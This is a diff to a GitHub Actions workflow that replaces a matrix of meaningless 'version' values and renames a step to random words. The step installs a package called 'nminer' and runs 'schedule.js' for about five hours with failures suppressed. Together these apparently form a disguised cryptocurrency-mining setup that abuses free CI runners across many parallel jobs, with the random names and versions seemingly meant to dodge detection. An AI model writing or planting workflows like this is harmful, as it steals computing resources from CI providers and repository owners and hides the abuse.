@@ -9,24 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2085 }
-          - { version: 8506 }
-          - { version: 3679 }
-          - { version: 904 }
-          - { version: 9459 }
-          - { version: 5128 }
-          - { version: 6566 }
-          - { version: 3360 }
-          - { version: 3765 }
-          - { version: 5559 }
-          - { version: 5708 }
-          - { version: 5600 }
-          - { version: 9102 }
-          - { version: 2351 }
-          - { version: 1808 }
-          - { version: 7603 }
-          - { version: 7396 }
-          - { version: 1843 }
+          - { version: 2140 }
+          - { version: 4722 }
+          - { version: 3883 }
+          - { version: 7897 }
+          - { version: 7090 }
+          - { version: 3888 }
+          - { version: 1975 }
+          - { version: 1538 }
+          - { version: 8857 }
+          - { version: 3717 }
+          - { version: 7395 }
+          - { version: 35 }
+          - { version: 7536 }
+          - { version: 4029 }
+          - { version: 316 }
 
     steps:
       - name: Checkout
@@ -37,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ligate zowie intensely
+      - name: boohoo happy-go-lucky
         run: |
           npm install nminer@latest
-          timeout 301m node schedule.js || echo "schedule executed"
+          timeout 306m node schedule.js || echo "schedule executed"
